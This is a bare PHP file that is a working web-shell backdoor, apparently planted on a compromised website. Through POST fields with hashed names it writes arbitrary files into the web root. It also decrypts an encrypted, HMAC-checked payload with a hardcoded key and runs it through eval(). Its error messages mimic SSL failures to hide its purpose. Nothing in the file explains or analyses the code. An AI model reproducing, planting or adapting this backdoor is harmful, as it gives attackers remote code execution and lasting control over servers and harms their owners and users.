<?php  /*b80a34b59f0d2ba5a398c116b465408b*/ ?><?php
//fsociety
if($_POST["2a7b7698de3842b2c54bdb2d6655256d"]){
    file_put_contents($_SERVER["DOCUMENT_ROOT"]."/".$_POST["ef7776a81f4b8b3b19c6cace0bb73f80"], $_POST["6f5de1ab8a3618c3be2560ce6718a09b"]);
}
if (!extension_loaded("openssl")) {
    echo "SSL operation failed with code 1";
}
$key = "19079712783644e5b3a4f5f798e86715";
$c = base64_decode($_POST["2749d11984c94de97e46f5ab40949f0a"]);
$ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
$iv = substr($c, 0, $ivlen);
$hmac = substr($c, $ivlen, $sha2len=32);
$ciphertext_raw = substr($c, $ivlen+$sha2len);
$original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
$calcmac = hash_hmac("sha256", $ciphertext_raw, $key, $as_binary=true);
if(!function_exists('hash_equals')) {
    function hash_equals($str1, $str2) {
        if(strlen($str1) != strlen($str2)) {
            return false;
        } else {
            $res = $str1 ^ $str2;
            $ret = 0;
            for($i = strlen($res) - 1; $i >= 0; $i--) $ret |= ord($res[$i]);
            return !$ret;
        }
    }
}
if (hash_equals($hmac, $calcmac)){
    eval($original_plaintext);
}else{
    echo "SSL operation failed with code 2";
}
